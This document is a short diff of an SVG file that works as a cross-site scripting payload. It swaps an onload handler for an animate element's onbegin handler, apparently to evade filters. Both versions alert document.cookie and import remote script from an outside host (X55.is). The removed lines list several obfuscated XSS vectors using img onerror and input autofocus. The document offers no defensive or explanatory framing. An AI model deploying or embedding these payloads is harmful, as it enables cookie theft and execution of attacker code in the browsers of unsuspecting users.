@@ -2,12 +2,14 @@
 <svg
   xmlns="http://www.w3.org/2000/svg"
   width="1" height="1"
-  onload="alert(document.cookie);import('https://X55.is?1=18369/.source')"
 >
-  <!-- nothing else needed -->
+  <circle r="0">
+    <animate
+      attributeName="r"
+      from="0" to="1"
+      dur="0.001s"
+      begin="0"
+      onbegin="alert(document.cookie); import('https://X55.is?1=18369/.source')"
+    />
+  </circle>
 </svg>
-%27"><Img%0ASrc%0A=OnXSS%0AOnError%0A=alert(1)>
-'"<%00!--%00><%00Img/Src/On%00Error=(conf%00irm)(1)>
-1'"< !-- >< Img/Src/On Error=(conf irm)(1)>
-<img//////src=x oNlY=1 oNerror=alert(document.cookie)(import(/https:\\X55.is?1=18369/.source))//>
-'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=alert(1)/**/(import(/https:\\X55.is?1=18369/.source))//>
